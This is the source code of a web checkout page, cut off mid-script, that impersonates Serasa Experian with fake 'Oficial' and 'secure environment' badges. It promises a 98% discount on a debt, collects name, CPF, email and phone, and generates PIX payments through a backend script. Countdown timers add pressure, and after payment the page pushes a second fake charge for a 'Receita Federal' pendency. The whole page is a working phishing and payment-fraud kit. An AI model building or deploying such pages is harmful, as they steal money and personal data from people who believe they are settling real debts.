<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#E80070">
    <title>Serasa Limpa Nome - Checkout</title>
    
    <!-- Favicon Serasa -->
    <link rel="icon" type="image/png" href="https://www.serasa.com.br/favicon.ico">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- GTM Tracker -->
    <script>
        const GTMTracker = {
            pixels: [],
            loaded: false,
            gtagLoaded: false,
            
            async init() {
                try {
                    const response = await fetch('api/pixels.php');
                    const data = await response.json();
                    
                    if (data.success && data.pixels && data.pixels.length > 0) {
                        this.pixels = data.pixels;
                        await this.loadGtagScript(this.pixels[0].pixel);
                        this.pixels.forEach(p => {
                            if (typeof gtag !== 'undefined') gtag('config', p.pixel);
                        });
                        this.loaded = true;
                    }
                } catch (error) {
                    console.error('[GTM] Erro:', error);
                }
            },
            
            loadGtagScript(pixelId) {
                return new Promise((resolve) => {
                    if (this.gtagLoaded) { resolve(); return; }
                    window.dataLayer = window.dataLayer || [];
                    window.gtag = function() { dataLayer.push(arguments); };
                    gtag('js', new Date());
                    const script = document.createElement('script');
                    script.async = true;
                    script.src = 'https://www.googletagmanager.com/gtag/js?id=' + pixelId;
                    script.onload = () => { this.gtagLoaded = true; resolve(); };
                    document.head.appendChild(script);
                });
            },
            
            trackConversion(value, transactionId) {
                if (!this.loaded || this.pixels.length === 0) {
                    setTimeout(() => this.trackConversion(value, transactionId), 500);
                    return;
                }
                const txnId = transactionId || ('txn_' + Date.now());
                this.pixels.forEach(pixel => {
                    const sendTo = pixel.pixel + '/' + pixel.label;
                    const params = { 'send_to': sendTo, 'transaction_id': txnId };
                    if (value !== null && value > 0) {
                        params.value = value;
                        params.currency = 'BRL';
                    }
                    gtag('event', 'conversion', params);
                });
            }
        };
        
        document.addEventListener('DOMContentLoaded', () => GTMTracker.init());
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
    </script>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
    <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'serasa-pink': '#E80070',
                        'serasa-pink-light': '#FF5994',
                        'serasa-pink-dark': '#C4005F',
                        'serasa-brown': '#894D33',
                        'serasa-gray': '#333333',
                        'serasa-light': '#FFF5F9'
                    },
                    fontFamily: {
                        'inter': ['Inter', 'sans-serif']
                    }
                }
            }
        }
    </script>

<style>
    * {
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        -webkit-tap-highlight-color: transparent;
    }

    body {
        background: linear-gradient(180deg, #FFF5F9 0%, #FFFFFF 100%);
        min-height: 100vh;
    }

    /* Header Serasa */
    .serasa-header {
        background: linear-gradient(135deg, #E80070 0%, #FF5994 100%);
        box-shadow: 0 4px 20px rgba(232, 0, 112, 0.3);
    }

    /* Cards */
    .card {
        background: #FFFFFF;
        border-radius: 20px;
        box-shadow: 0 8px 32px rgba(232, 0, 112, 0.08), 0 2px 8px rgba(0,0,0,0.04);
        border: 1px solid rgba(232, 0, 112, 0.08);
    }

    /* Inputs */
    .input-serasa {
        width: 100%;
        padding: 16px;
        border: 2px solid #E5E7EB;
        border-radius: 12px;
        font-size: 16px;
        transition: all 0.2s ease;
        background: #FAFAFA;
    }
    .input-serasa:focus {
        border-color: #E80070;
        box-shadow: 0 0 0 4px rgba(232, 0, 112, 0.15);
        outline: none;
        background: #FFFFFF;
    }
    .input-serasa::placeholder {
        color: #9CA3AF;
    }

    /* Bot√µes */
    .btn-primary {
        background: linear-gradient(135deg, #E80070 0%, #FF5994 100%);
        color: white;
        padding: 18px 32px;
        border-radius: 14px;
        font-weight: 700;
        font-size: 18px;
        width: 100%;
        border: none;
        cursor: pointer;
        transition: all 0.2s ease;
        box-shadow: 0 8px 24px rgba(232, 0, 112, 0.35);
        position: relative;
        overflow: hidden;
    }
    .btn-primary:hover {
        transform: translateY(-2px);
        box-shadow: 0 12px 32px rgba(232, 0, 112, 0.45);
    }
    .btn-primary:active {
        transform: translateY(0);
    }

    /* Pulse animation */
    .btn-pulse {
        animation: pulse 2s infinite;
    }
    @keyframes pulse {
        0%, 100% { box-shadow: 0 8px 24px rgba(232, 0, 112, 0.35); }
        50% { box-shadow: 0 8px 40px rgba(232, 0, 112, 0.55); }
    }

    /* Progress Steps */
    .step-circle {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        font-size: 14px;
        transition: all 0.3s ease;
    }
    .step-active {
        background: linear-gradient(135deg, #E80070 0%, #FF5994 100%);
        color: white;
        box-shadow: 0 4px 12px rgba(232, 0, 112, 0.4);
    }
    .step-inactive {
        background: #E5E7EB;
        color: #9CA3AF;
    }
    .step-line {
        height: 3px;
        flex: 1;
        margin: 0 8px;
        border-radius: 2px;
        transition: all 0.3s ease;
    }

    /* Badge */
    .badge-discount {
        background: linear-gradient(135deg, #10B981 0%, #059669 100%);
        color: white;
        padding: 6px 14px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: 700;
        display: inline-flex;
        align-items: center;
        gap: 4px;
        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
    }

    /* Value highlight */
    .value-box {
        background: linear-gradient(135deg, #FFF5F9 0%, #FFE4EF 100%);
        border: 2px solid rgba(232, 0, 112, 0.15);
        border-radius: 16px;
        padding: 20px;
    }

    /* Timer */
    .timer-box {
        background: linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%);
        border: 2px solid #F59E0B;
        border-radius: 12px;
        padding: 12px 20px;
    }

    /* QR Code container */
    .qr-container {
        background: white;
        border: 2px dashed rgba(232, 0, 112, 0.2);
        border-radius: 16px;
        padding: 16px;
        display: inline-block;
    }

    /* PIX code input */
    .pix-input {
        font-family: 'Courier New', monospace;
        font-size: 11px;
        background: #F9FAFB;
        border: 2px solid #E5E7EB;
        border-radius: 10px;
        padding: 12px;
        width: 100%;
    }

    /* Copy button */
    .btn-copy {
        background: linear-gradient(135deg, #E80070 0%, #FF5994 100%);
        color: white;
        padding: 12px 24px;
        border-radius: 10px;
        font-weight: 600;
        white-space: nowrap;
        transition: all 0.2s ease;
    }
    .btn-copy:hover {
        transform: scale(1.02);
    }

    /* Trust badges */
    .trust-badge {
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 8px 12px;
        background: #F0FDF4;
        border-radius: 8px;
        font-size: 13px;
        color: #166534;
    }

    /* Responsive */
    @media (max-width: 640px) {
        .card {
            border-radius: 16px;
            margin: 0 -8px;
        }
        .btn-primary {
            padding: 16px 24px;
            font-size: 16px;
        }
        .step-circle {
            width: 32px;
            height: 32px;
            font-size: 12px;
        }
    }

    /* Loading overlay */
    .loading-overlay {
        backdrop-filter: blur(4px);
    }

    /* Smooth transitions */
    .fade-in {
        animation: fadeIn 0.3s ease;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }

    /* Verified badge */
    .verified-badge {
        background: linear-gradient(135deg, #E80070 0%, #FF5994 100%);
        color: white;
        padding: 4px 10px;
        border-radius: 6px;
        font-size: 11px;
        font-weight: 600;
        display: inline-flex;
        align-items: center;
        gap: 4px;
    }
</style>

</head>
<body>
    <!-- Header Serasa -->
    <header class="serasa-header sticky top-0 z-50">
        <div class="container mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <!-- Logo Serasa SVG -->
                    <svg viewBox="0 0 120 40" class="h-8" fill="white">
                        <text x="0" y="28" font-family="Inter, sans-serif" font-size="24" font-weight="800">serasa</text>
                    </svg>
                    <span class="verified-badge">
                        <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                        </svg>
                        Oficial
                    </span>
                </div>
                <div class="flex items-center gap-2">
                    <svg class="w-5 h-5 text-white/80" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                    </svg>
                    <span class="text-white/90 text-sm font-medium hidden sm:block">Ambiente Seguro</span>
                </div>
            </div>
        </div>
    </header>

    <main class="container mx-auto px-4 py-6 max-w-lg">
        
        <!-- Progress Steps -->
        <div class="flex items-center justify-center mb-6">
            <div id="step1-indicator" class="step-circle step-active">1</div>
            <div id="step-line" class="step-line bg-gray-200"></div>
            <div id="step2-indicator" class="step-circle step-inactive">2</div>
        </div>

        <!-- Loading Overlay -->
        <div id="loadingOverlay" class="fixed inset-0 bg-black/50 hidden flex items-center justify-center z-50 loading-overlay">
            <div class="bg-white p-8 rounded-2xl flex flex-col items-center shadow-2xl">
                <div class="w-16 h-16 border-4 border-serasa-pink border-t-transparent rounded-full animate-spin mb-4"></div>
                <p class="text-serasa-gray font-medium">Gerando c√≥digo PIX...</p>
            </div>
        </div>

        <!-- Modal Timeout -->
        <div id="analiseModal" class="fixed inset-0 bg-black/50 hidden flex items-center justify-center z-50 p-4">
            <div class="bg-white p-6 rounded-2xl max-w-sm w-full shadow-2xl">
                <div class="text-center mb-4">
                    <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                        </svg>
                    </div>
                    <h3 class="text-xl font-bold text-serasa-gray mb-2">Tempo Esgotado</h3>
                    <p class="text-gray-500">Gere um novo c√≥digo PIX para continuar.</p>
                </div>
                <button onclick="location.reload()" class="btn-primary">Gerar Novo C√≥digo</button>
            </div>
        </div>

        <!-- STEP 1: Formul√°rio -->
        <div id="formStep1" class="card p-6 fade-in">
            
            <!-- Valor em destaque -->
            <div class="value-box mb-6">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm text-serasa-gray/70 mb-1">Valor total da d√≠vida</p>
                        <p class="text-lg text-gray-400 line-through">R$ 7.566,52</p>
                    </div>
                    <div class="text-right">
                        <span class="badge-discount mb-2">
                            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M5 2a2 2 0 00-2 2v14l3.5-2 3.5 2 3.5-2 3.5 2V4a2 2 0 00-2-2H5zm2.5 3a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm6.207.293a1 1 0 00-1.414 0l-6 6a1 1 0 101.414 1.414l6-6a1 1 0 000-1.414zM12.5 10a1.5 1.5 0 100 3 1.5 1.5 0 000-3z" clip-rule="evenodd"/>
                            </svg>
                            98% OFF
                        </span>
                        <p class="text-3xl font-extrabold text-serasa-pink" id="servicoValor">R$ 78,47</p>
                    </div>
                </div>
            </div>

            <h2 class="text-xl font-bold text-serasa-gray mb-1">Confirme seus dados</h2>
            <p class="text-gray-500 text-sm mb-6">Para gerar o c√≥digo PIX do seu acordo</p>

            <form class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-serasa-gray mb-2">Nome Completo</label>
                    <input type="text" name="nome" class="input-serasa" placeholder="Seu nome completo" required>
                </div>
                <div>
                    <label class="block text-sm font-medium text-serasa-gray mb-2">CPF</label>
                    <input type="tel" name="cpf" class="input-serasa" placeholder="000.000.000-00" required>
                </div>
                <div>
                    <label class="block text-sm font-medium text-serasa-gray mb-2">Email</label>
                    <input type="email" name="email" class="input-serasa" placeholder="seu@email.com" required>
                </div>
                <div>
                    <label class="block text-sm font-medium text-serasa-gray mb-2">Telefone</label>
                    <input type="tel" name="telefone" class="input-serasa" placeholder="(00) 00000-0000" required>
                </div>
            </form>

            <!-- Trust badges -->
            <div class="flex flex-wrap gap-2 mt-6 mb-6">
                <div class="trust-badge">
                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                    </svg>
                    Dados protegidos
                </div>
                <div class="trust-badge">
                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z"/>
                    </svg>
                    PIX instant√¢neo
                </div>
            </div>

            <button type="button" onclick="emitirGuia()" class="btn-primary btn-pulse">
                <span class="flex items-center justify-center gap-2">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                    Gerar PIX e Limpar Nome
                </span>
            </button>

            <p class="text-center text-xs text-gray-400 mt-4">
                üîí Seus dados est√£o seguros e criptografados
            </p>
        </div>

        <!-- STEP 2: PIX -->
        <div id="formStep4" class="hidden card p-6 fade-in">
            
            <div class="text-center mb-6">
                <div class="inline-flex items-center gap-2 bg-green-50 text-green-700 px-4 py-2 rounded-full text-sm font-medium mb-4">
                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                    </svg>
                    Acordo gerado com sucesso!
                </div>
                <h2 class="text-xl font-bold text-serasa-gray">Pague via PIX</h2>
            </div>

            <!-- QR Code Desktop -->
            <div id="qrcode-container" class="hidden md:flex justify-center mb-6">
                <div class="qr-container">
                    <img id="qrcode" src="" alt="QR Code PIX" class="w-48 h-48">
                </div>
            </div>

            <!-- QR Code Mobile (toggle) -->
            <div class="md:hidden mb-4">
                <button onclick="toggleQRCode()" class="w-full py-3 border-2 border-serasa-pink text-serasa-pink rounded-xl font-medium flex items-center justify-center gap-2">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"/>
                    </svg>
                    <span id="qr-toggle-text">Ver QR Code</span>
                </button>
                <div id="mobile-qrcode" class="hidden mt-4 flex justify-center">
                    <div class="qr-container">
                        <img id="qrcode-mobile" src="" alt="QR Code PIX" class="w-48 h-48">
                    </div>
                </div>
            </div>

            <!-- Valor -->
            <div class="value-box mb-4">
                <div class="flex justify-between items-center">
                    <div>
                        <p class="text-sm text-gray-500">Servi√ßo</p>
                        <p class="font-semibold text-serasa-gray" id="pixTitulo"></p>
                    </div>
                    <div class="text-right">
                        <p class="text-sm text-gray-500">Valor</p>
                        <p class="text-2xl font-bold text-serasa-pink" id="pixValor"></p>
                    </div>
                </div>
            </div>

            <!-- PIX Copia e Cola -->
            <div class="mb-4">
                <label class="block text-sm font-medium text-serasa-gray mb-2">C√≥digo PIX Copia e Cola</label>
                <div class="flex gap-2">
                    <input id="pixCode" type="text" readonly class="pix-input flex-1">
                    <button onclick="copiarPix()" class="btn-copy">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
                        </svg>
                    </button>
                </div>
            </div>

            <!-- Mensagem positiva -->
            <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-4">
                <div class="flex gap-3">
                    <svg class="w-6 h-6 text-green-600 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                    </svg>
                    <p class="text-sm text-green-800">
                        <strong>Ap√≥s o pagamento</strong>, seu nome ser√° limpo em at√© <strong>1 hora</strong> e voc√™ receber√° a confirma√ß√£o por email.
                    </p>
                </div>
            </div>

            <!-- Timer -->
            <div class="timer-box flex items-center justify-between mb-6">
                <div class="flex items-center gap-2">
                    <svg class="w-5 h-5 text-yellow-600" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/>
                    </svg>
                    <span class="text-sm font-medium text-yellow-800">Tempo restante</span>
                </div>
                <span id="timer" class="text-xl font-bold text-yellow-800">15:00</span>
            </div>

            <!-- Como pagar -->
            <div class="border border-gray-100 rounded-xl p-4">
                <h3 class="font-semibold text-serasa-gray mb-3 flex items-center gap-2">
                    <svg class="w-5 h-5 text-serasa-pink" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                    </svg>
                    Como pagar
                </h3>
                <div class="space-y-3">
                    <div class="flex items-center gap-3">
                        <span class="w-6 h-6 rounded-full bg-serasa-pink text-white text-xs font-bold flex items-center justify-center">1</span>
                        <span class="text-sm text-gray-600">Abra o app do banco ‚Üí <strong>PIX</strong></span>
                    </div>
                    <div class="flex items-center gap-3">
                        <span class="w-6 h-6 rounded-full bg-serasa-pink text-white text-xs font-bold flex items-center justify-center">2</span>
                        <span class="text-sm text-gray-600">Escaneie o QR ou cole o c√≥digo</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <span class="w-6 h-6 rounded-full bg-serasa-pink text-white text-xs font-bold flex items-center justify-center">3</span>
                        <span class="text-sm text-gray-600">Confirme e pronto! ‚úÖ</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Upsell & outros steps mantidos igual... simplificado por brevidade -->
        <div id="formStep5" class="hidden card p-6 fade-in">
            <div id="upsellRG" class="hidden"></div>
            <div id="upsellDIFF" class="hidden">
                <div class="text-center mb-6">
                    <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                        </svg>
                    </div>
                    <h3 class="text-xl font-bold text-serasa-gray mb-2">Pend√™ncia na Receita Federal</h3>
                    <p class="text-gray-500 text-sm">Regularize agora para evitar bloqueios</p>
                </div>
                <div class="value-box mb-6">
                    <p class="text-center text-3xl font-bold text-serasa-pink">R$ 42,21</p>
                </div>
                <button onclick="adquirirUpsell('CNH')" class="btn-primary">Regularizar Agora</button>
            </div>
            <div id="upsellCNH" class="hidden"></div>
        </div>

        <div id="formStep6" class="hidden card p-6 fade-in">
            <!-- PIX Upsell - estrutura similar ao formStep4 -->
            <div class="text-center mb-6">
                <h2 class="text-xl font-bold text-serasa-gray">Pague o Adicional</h2>
            </div>
            <div class="flex justify-center mb-4">
                <div class="qr-container">
                    <img id="qrcode-upsell" src="" alt="QR Code" class="w-40 h-40">
                </div>
            </div>
            <div class="hidden">
                <img id="qrcode-mobile-upsell" src="">
            </div>
            <div class="value-box mb-4">
                <div class="flex justify-between items-center">
                    <span class="text-gray-500" id="pixTituloUpsell">Receita Federal</span>
                    <span class="text-xl font-bold text-serasa-pink" id="pixValorUpsell">R$ 42,21</span>
                </div>
            </div>
            <div class="flex gap-2 mb-4">
                <input id="pixCodeUpsell" type="text" readonly class="pix-input flex-1">
                <button onclick="copiarPixUpsell()" class="btn-copy">Copiar</button>
            </div>
            <div class="timer-box flex items-center justify-between">
                <span class="text-sm font-medium text-yellow-800">Tempo restante</span>
                <span id="timerUpsell" class="text-xl font-bold text-yellow-800">15:00</span>
            </div>
        </div>

        <div id="formStep7" class="hidden card p-6 fade-in">
            <div class="text-center">
                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                    <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
                    </svg>
                </div>
                <h2 class="text-2xl font-bold text-green-600 mb-2">Pagamento Confirmado!</h2>
                <p class="text-gray-500">Seu nome ser√° limpo em at√© 1 hora.</p>
                <p class="text-gray-500 text-sm mt-2">Voc√™ receber√° a confirma√ß√£o por email.</p>
            </div>
        </div>

    </main>

    <!-- Footer -->
    <footer class="mt-8 py-6 border-t border-gray-100">
        <div class="container mx-auto px-4 text-center">
            <p class="text-gray-400 text-sm">¬© Serasa Experian ‚Ä¢ Todos os direitos reservados</p>
            <p class="text-gray-300 text-xs mt-1">üîí Ambiente 100% seguro e criptografado</p>
        </div>
    </footer>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const titulo = urlParams.get('titulo') || 'Taxa de Acordo';
        const valor = urlParams.get('valor') || '78,47';

        document.getElementById('servicoValor').textContent = `R$ ${valor}`;

        // Preencher dados da URL
        window.addEventListener('DOMContentLoaded', () => {
            const params = new URLSearchParams(window.location.search);
            if (params.has('nome')) document.querySelector('input[name="nome"]').value = params.get('nome');
            if (params.has('cpf')) document.querySelector('input[name="cpf"]').value = params.get('cpf');
            if (params.has('email')) document.querySelector('input[name="email"]').value = params.get('email');
            if (params.has('telefone')) document.querySelector('input[name="telefone"]').value = params.get('telefone');
        });

        // Valida√ß√µes
        function validarCPF(cpf) {
            cpf = cpf.replace(/[^\d]/g, '');
            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
            let soma = 0;
            for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
            let dv1 = (11 - (soma % 11)) > 9 ? 0 : (11 - (soma % 11));
            soma = 0;
            for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
            let dv2 = (11 - (soma % 11)) > 9 ? 0 : (11 - (soma % 11));
            return dv1 === parseInt(cpf.charAt(9)) && dv2 === parseInt(cpf.charAt(10));
        }

        function validarEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function formatarCPF(input) {
            let v = input.value.replace(/\D/g, '').slice(0, 11);
            v = v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            input.value = v;
        }

        function formatarTelefone(input) {
            let v = input.value.replace(/\D/g, '').slice(0, 11);
            if (v.length > 2) v = '(' + v.substring(0,2) + ') ' + v.substring(2);
            if (v.length > 10) v = v.substring(0,10) + '-' + v.substring(10);
            input.value = v;
        }

        function validarTelefone(tel) {
            return tel.replace(/\D/g, '').length >= 10;
        }

        document.addEventListener('DOMContentLoaded', () => {
            document.querySelector('input[name="cpf"]').addEventListener('input', function() { formatarCPF(this); });
            document.querySelector('input[name="telefone"]').addEventListener('input', function() { formatarTelefone(this); });
        });

        function notify(msg, isError = false) {
            Toastify({
                text: msg,
                duration: 3000,
                gravity: "top",
                position: "center",
                style: { background: isError ? "#EF4444" : "#10B981", borderRadius: "12px", fontWeight: "600" }
            }).showToast();
        }

        function validarFormulario() {
            const nome = document.querySelector('input[name="nome"]').value;
            const cpf = document.querySelector('input[name="cpf"]').value;
            const email = document.querySelector('input[name="email"]').value;
            const telefone = document.querySelector('input[name="telefone"]').value;
            if (nome.length < 3) { notify('Insira um nome v√°lido', true); return false; }
            if (!validarCPF(cpf)) { notify('Insira um CPF v√°lido', true); return false; }
            if (!validarEmail(email)) { notify('Insira um email v√°lido', true); return false; }
            if (!validarTelefone(telefone)) { notify('Insira um telefone v√°lido', true); return false; }
            return true;
        }

        // Check PIX existente
        document.addEventListener('DOMContentLoaded', () => {
            const pixData = localStorage.getItem('pixData');
            if (pixData) {
                const data = JSON.parse(pixData);
                if (data.titulo === titulo && data.valor === valor) {
                    document.getElementById('formStep1').classList.add('hidden');
                    mostrarPix(data);
                    verificarPagamento(data.transaction_id);
                }
            }
        });

        function emitirGuia() {
            if (!validarFormulario()) return;
            document.getElementById('loadingOverlay').classList.remove('hidden');

            const dadosFormulario = {
                nome: document.querySelector('input[name="nome"]').value,
                cpf: document.querySelector('input[name="cpf"]').value,
                email: document.querySelector('input[name="email"]').value,
                telefone: document.querySelector('input[name="telefone"]').value,
                valor: Math.round(parseFloat(valor.replace(',', '.')) * 100),
                titulo: titulo
            };
            localStorage.setItem('formData', JSON.stringify(dadosFormulario));

            fetch('gerarPixBlackCat.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosFormulario)
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('loadingOverlay').classList.add('hidden');
                if (data.success) {
                    const pixData = { ...data.data, titulo, valor };
                    localStorage.setItem('pixData', JSON.stringify(pixData));
                    mostrarPix(pixData);
                } else {
                    notify(data.error || 'Erro ao gerar PIX', true);
                }
            })
            .catch(() => {
                document.getElementById('loadingOverlay').classList.add('hidden');
                notify('Erro ao gerar PIX', true);
            });
        }

        function mostrarPix(data) {
            document.getElementById('formStep1').classList.add('hidden');
            document.getElementById('formStep4').classList.remove('hidden');
            document.getElementById('qrcode').src = data.qrcode_image;
            document.getElementById('qrcode-mobile').src = data.qrcode_image;
            document.getElementById('pixCode').value = data.qrcode_text;
            document.getElementById('pixTitulo').textContent = titulo;
            document.getElementById('pixValor').textContent = `R$ ${valor.replace('.', ',')}`;
            
            // Update progress
            document.getElementById('step1-indicator').classList.add('step-active');
            document.getElementById('step2-indicator').classList.remove('step-inactive');
            document.getElementById('step2-indicator').classList.add('step-active');
            document.getElementById('step-line').classList.remove('bg-gray-200');
            document.getElementById('step-line').classList.add('bg-serasa-pink');

            iniciarTimer();
            verificarPagamento(data.transaction_id);
        }

        function verificarPagamento(transactionId) {
            let t = 0;
            function check() {
                t++;
                if (t >= 90) { clearInterval(i); return; }
                fetch(`verificarPagamento.php?id=${transactionId}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.success && (d.status === 'paid' || d.status === 'approved')) {
                            clearInterval(i);
                            mostrarUpsell();
                        }
                    }).catch(() => {});
            }
            check();
            const i = setInterval(check, 10000);
        }

        function mostrarUpsell() {
            document.getElementById('formStep4').classList.add('hidden');
            document.getElementById('formStep5').classList.remove('hidden');
            GTMTracker.trackConversion(parseFloat(valor.replace(',', '.')), 'approved_' + Date.now());
            if (titulo.includes('RG')) document.getElementById('upsellRG').classList.remove('hidden');
            else if (titulo.includes('CNH')) document.getElementById('upsellCNH').classList.remove('hidden');
            else document.getElementById('upsellDIFF').classList.remove('hidden');
        }

        function adquirirUpsell(tipo) {
            document.getElementById('loadingOverlay').classList.remove('hidden');
            const formData = JSON.parse(localStorage.getItem('formData'));
            if (!formData) { notify('Dados n√£o encontrados', true); return; }

            const dados = { nome: formData.nome, cpf: formData.cpf, email: formData.email, valor: 4221, titulo: 'Receita Federal' };
